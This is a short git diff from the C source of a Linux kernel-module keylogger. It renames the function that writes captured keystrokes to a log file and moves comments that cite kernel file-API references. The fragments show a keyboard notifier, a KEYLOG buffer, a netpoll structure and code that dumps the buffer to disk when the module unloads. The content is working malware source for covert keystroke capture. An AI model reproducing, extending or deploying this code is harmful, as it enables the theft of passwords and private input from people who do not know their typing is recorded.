@@ -48,11 +48,24 @@ static const char* keysShift[] =
 
 static struct notifier_block nb;
 static struct netpoll np;
-char buffer[MAX_BUFFER] = "\nKEYLOG\n--------------------------\n"; //TODO add timestamp
+char buffer[MAX_BUFFER] = "\nKEYLOG\n--------------------------\n"; 
 static struct file *outfile = NULL;
 
+/*
+/	Found the filp functions here
+/	http://lxr.free-electrons.com/source/fs/open.c#L1072
+/	
+/	Flags for filp
+/	http://pubs.opengroup.org/onlinepubs/7908799/xsh/open.html
+/	
+/	set_fs()
+/	http://lxr.free-electrons.com/source/arch/blackfin/include/asm/uaccess.h#L25
+/
+/	Working example of filp in kernel
+/	http://lxr.free-electrons.com/source/drivers/staging/ath6kl/os/linux/ar6000_android.c?v=2.6.37
+*/
 
-void log(char str[]){
+void logLocal(char str[]){
 	mm_segment_t prevfs;
 	outfile = filp_open(LOG_DIR, O_RDWR | O_APPEND, 0);
 	if(!outfile)
@@ -121,17 +134,9 @@ static int __init init_keylogger(void){
 /	exit_keylogger
 /	The module_exit function, should be straightforward enough
 /
-/	Found the filp functions here
-/	http://lxr.free-electrons.com/source/fs/open.c#L1072
-/	
-/	Flags for filp
-/	http://pubs.opengroup.org/onlinepubs/7908799/xsh/open.html
-/	
-/	set_fs()
-/	http://lxr.free-electrons.com/source/arch/blackfin/include/asm/uaccess.h#L25
 */
 static void __exit exit_keylogger(void){
-	log(buffer);
+	logLocal(buffer);
 	unregister_keyboard_notifier(&nb);
 }
 
